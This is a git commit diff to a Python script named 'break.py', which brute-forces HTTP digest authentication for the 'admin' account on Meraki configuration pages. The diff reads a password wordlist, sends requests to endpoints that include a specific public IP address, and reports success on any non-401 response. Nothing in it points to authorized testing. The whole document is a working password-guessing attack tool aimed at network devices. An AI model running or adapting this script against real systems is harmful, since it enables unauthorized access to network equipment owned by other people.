e4c1161ea4717cc9308804f5d1395d39d2271d46
~justin <spacepepper3.14@gmail.com>
2022-10-27 16:21:49 -0400

    print less and better code

--- break.py
+++ break.py
@@ -9,17 +9,19 @@ url2 = 'http://setup.meraki.com/configure'
 url3 = 'http://138.207.175.210/configure'
 url4 = 'http://172.16.1.1/configure/index.cgi'
 
+total = 500000
 
 with open('pwd.txt') as file:
     passwords = [line.rstrip() for line in file]
 
 
-for i in range(len(passwords)):
-    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i+500000]))
-    if request.status_code == 200:
-        print(f'\n\nSuccess! Password is \"{passwords[i]}\"')
+for i in range(len(passwords)-total, len(passwords)):
+    request = requests.head(url1, auth=HTTPDigestAuth('admin', passwords[i]))
+    if request.status_code != 401:
+        print(f'\n\nSuccess! Password is \"{passwords[i]} and counter is {i}. Status code was {request.status_code}\"')
         break
-    print(f'{i+500000}:{request.status_code}, ', end='')
+    if i % 100 == 0:
+        print(f'{i}, ', end='')
 
 
 # r = requests.get('https://authenticationtest.com/HTTPAuth/', auth=('user', 'pass'))
